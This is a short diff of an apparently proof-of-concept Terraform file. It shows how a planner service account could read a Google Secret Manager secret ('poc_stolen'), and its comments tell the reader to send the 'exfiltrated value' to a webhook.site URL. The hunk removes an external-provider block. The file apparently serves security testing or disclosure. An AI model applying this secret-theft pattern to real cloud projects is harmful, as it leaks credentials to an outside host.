@@ -3,14 +3,6 @@
 # The SA has secretAccessor on poc-terraform-planner-secret-exfil-test (created by poc_secret.tf).
 # Replace WEBHOOK_URL below with your https://webhook.site/... URL to see the exfiltrated value.
 
-terraform {
-  required_providers {
-    external = {
-      source  = "hashicorp/external"
-      version = ">= 2.0"
-    }
-  }
-}
 
 data "google_secret_manager_secret_version" "poc_stolen" {
   project = var.terraform_planner_gcp_service_account.project_id
